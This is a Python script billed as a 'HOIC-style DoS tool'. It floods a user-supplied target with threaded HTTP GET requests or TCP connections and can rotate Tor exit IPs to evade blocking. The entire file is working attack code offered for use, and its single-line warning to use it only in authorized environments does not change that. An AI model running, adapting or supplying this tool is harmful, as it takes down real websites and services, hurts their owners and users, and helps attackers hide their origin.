import threading
import requests
import socket
import time
import random
import os
from stem import Signal
from stem.control import Controller
from colorama import Fore, Style, init
from pyfiglet import Figlet

# Initialize colorama
init(autoreset=True)

# ========== USER INPUT ==========
f = Figlet(font='slant')
print(Fore.CYAN + f.renderText('Anil Bishnoi'))
print(Fore.YELLOW + "HOIC-Style DoS Tool v1.0")
print(Fore.RED + "[⚠️] Use only in authorized environments!")
print(Fore.GREEN + "=" * 50)

URL = input(Fore.CYAN + "Enter target URL or IP: ").strip()
MODE = input(Fore.CYAN + "Enter mode (HTTP/TCP): ").strip().upper()
TOR_PASSWORD = input(Fore.CYAN + "Enter Tor control password: ").strip()
PORT = 0
if MODE == "TCP":
    PORT = int(input(Fore.CYAN + "Enter port number: "))
THREADS = int(input(Fore.CYAN + "Enter number of threads: "))
IP_ROTATION_INTERVAL = int(input(Fore.CYAN + "Enter Tor IP rotation interval (seconds): "))
USE_TOR = input(Fore.CYAN + "Use Tor for IP rotation? (y/n): ").strip().lower() == 'y'
# =================================

def rotate_tor_ip():
    os.setuid(os.getuid())  # Drop privileges for Tor control access
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=TOR_PASSWORD)
        while True:
            controller.signal(Signal.NEWNYM)
            print(Fore.MAGENTA + "[*] Tor IP rotated.")
            time.sleep(IP_ROTATION_INTERVAL)

def http_flood():
    while True:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Cache-Control': 'no-cache'
            }
            r = requests.get(URL, headers=headers, timeout=5)
            print(Fore.GREEN + f"[HTTP] Status: {r.status_code}")
        except Exception as e:
            print(Fore.RED + f"[HTTP] Error: {e}")

def tcp_flood():
    ip = socket.gethostbyname(URL.replace("http://", "").replace("https://", ""))
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, PORT))
            payload = b"GET / HTTP/1.1\r\nHost: " + bytes(ip, 'utf-8') + b"\r\n\r\n"
            sock.sendall(payload)
            sock.close()
            print(Fore.GREEN + f"[TCP] Packet sent to {ip}:{PORT}")
        except Exception as e:
            print(Fore.RED + f"[TCP] Error: {e}")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

if __name__ == '__main__':
    print(Fore.YELLOW + "[+] Starting HOIC-style DoS Tool")
    if USE_TOR:
        threading.Thread(target=rotate_tor_ip, daemon=True).start()

    for _ in range(THREADS):
        if MODE == "HTTP":
            threading.Thread(target=http_flood).start()
        elif MODE == "TCP":
            threading.Thread(target=tcp_flood).start()
        else:
            print(Fore.RED + "[!] Invalid mode. Choose 'HTTP' or 'TCP'")
            break
